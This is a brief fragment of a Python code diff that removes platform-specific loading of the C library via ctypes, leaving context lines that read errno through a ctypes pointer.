-        if sys.platform == 'darwin':
-            libc = ctypes.CDLL(ctypes.util.find_library('c'))
-        else:
-            libc = ctypes.cdll.LoadLibrary('libc.so.6')
         p_errno = ctypes.cast(libc.errno, ctypes.POINTER(ctypes.c_int))
         errno = p_errno.contents
         last_error = ctypes.c_int(0)
